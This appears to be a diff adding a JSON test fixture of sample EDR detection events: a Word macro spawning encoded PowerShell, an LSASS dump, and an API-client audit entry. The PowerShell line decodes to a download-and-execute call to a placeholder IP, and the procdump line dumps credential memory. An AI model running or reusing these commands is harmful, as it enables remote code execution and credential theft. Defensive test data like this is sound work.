@@ -1,0 +1,56 @@
+[
+  {
+    "cid": "0123456789abcdef0123456789abcdef",
+    "created_timestamp": "2026-10-23T12:15:22.123456789Z",
+    "detection_id": "ldt:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:4295032834",
+    "first_behavior": "2026-10-23T12:15:20Z",
+    "last_behavior": "2026-10-23T12:15:20Z",
+    "max_confidence": 90,
+    "max_severity": 70,
+    "max_severity_displayname": "High",
+    "status": "new",
+    "show_in_ui": true,
+    "falcon_host_link": "https://falcon.crowdstrike.com/activity/detections/detail/1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d/4295032834",
+    "device": {
+      "device_id": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d", "cid": "0123456789abcdef0123456789abcdef", "agent_version": "7.18.18913.0", "hostname": "FIN-LT-0427",
+      "platform_name": "Windows", "os_version": "Windows 11", "external_ip": "203.0.113.201", "local_ip": "10.40.2.57", "mac_address": "3c-22-fb-12-34-56",
+      "machine_domain": "CORP", "ou": ["Finance", "Laptops"], "product_type_desc": "Workstation", "status": "normal", "system_manufacturer": "Dell Inc."
+    },
+    "behaviors": [
+      {
+        "device_id": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d", "timestamp": "2026-10-23T12:15:20Z", "behavior_id": "41002", "filename": "powershell.exe",
+        "filepath": "\\Device\\HarddiskVolume3\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAwAC4AMgAuADUAMAAvAGEAJwApAA==",
+        "sha256": "9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f", "md5": "04029e121a0cfa5991749937dd22a1d9",
+        "parent_details": {"parent_sha256": "0d4a3b6f1d2e8c7b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b", "parent_cmdline": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\jdoe\\Downloads\\Invoice_Q4.docm\"", "filename": "WINWORD.EXE"},
+        "user_name": "jdoe", "user_id": "S-1-5-21-1111111111-2222222222-3333333333-1105",
+        "scenario": "suspicious_activity", "objective": "Falcon Detection Method", "tactic": "Execution", "tactic_id": "TA0002", "technique": "PowerShell", "technique_id": "T1059.001",
+        "display_name": "SuspiciousPowerShellEncodedCommand", "description": "A PowerShell process was launched with an encoded command by an Office application. Review the command line and parent process.",
+        "severity": 70, "confidence": 90, "ioc_type": "", "ioc_value": "", "pattern_disposition": 2048, "pattern_disposition_details": {"detect": true, "process_blocked": false}
+      }
+    ],
+    "email_sent": false,
+    "assigned_to_name": "",
+    "hostinfo": {"domain": "CORP"},
+    "seconds_to_triaged": 0,
+    "seconds_to_resolved": 0,
+    "behaviors_processed": ["pid:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d:123456:41002"]
+  },
+  {
+    "metadata": {"customerIDString": "0123456789abcdef0123456789abcdef", "offset": 184221, "eventType": "DetectionSummaryEvent", "eventCreationTime": 1792757820000, "version": "1.0"},
+    "event": {
+      "ProcessStartTime": 1792757810, "ProcessEndTime": 0, "ProcessId": 2139480101, "ParentProcessId": 2139470101, "ComputerName": "ops-jump-03", "UserName": "svc_ansible",
+      "DetectName": "CredentialDumpingViaLsass", "DetectDescription": "A process attempted to read LSASS memory. This is commonly associated with credential theft.",
+      "Severity": 5, "SeverityName": "Critical", "FileName": "procdump64.exe", "FilePath": "\\Device\\HarddiskVolume2\\Temp", "CommandLine": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
+      "SHA256String": "16f413862efda3aba631d8a7ae2bfff6d84acd9f454a7adaa518c7a8a6f375a5", "MD5String": "a92f13f3a1b3b39833d3cc336301b713", "MachineDomain": "CORP",
+      "FalconHostLink": "https://falcon.crowdstrike.com/activity/detections/detail/aabbccdd/4295032900", "SensorId": "aabbccddeeff00112233445566778899", "DetectId": "ldt:aabbccddeeff00112233445566778899:4295032900",
+      "LocalIP": "10.40.9.3", "MACAddress": "00-50-56-aa-bb-cc", "Tactic": "Credential Access", "Technique": "OS Credential Dumping", "Objective": "Gain Access", "PatternDispositionDescription": "Prevention, process killed.",
+      "PatternDispositionValue": 2176, "PatternDispositionFlags": {"Indicator": false, "Detect": false, "InddetMask": false, "SensorOnly": false, "Rooting": false, "KillProcess": true}
+    }
+  },
+  {
+    "metadata": {"customerIDString": "0123456789abcdef0123456789abcdef", "offset": 184222, "eventType": "AuthActivityAuditEvent", "eventCreationTime": 1792757900000, "version": "1.0"},
+    "event": {"UserId": "admin@example.com", "UserIp": "203.0.113.5", "OperationName": "createAPIClient", "ServiceName": "Crowdstrike API", "Success": true, "UTCTimestamp": 1792757900,
+              "AuditKeyValues": [{"Key": "APIClientID", "ValueString": "5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"}, {"Key": "scope(s)", "ValueString": "detects:read,hosts:write"}]}
+  }
+]
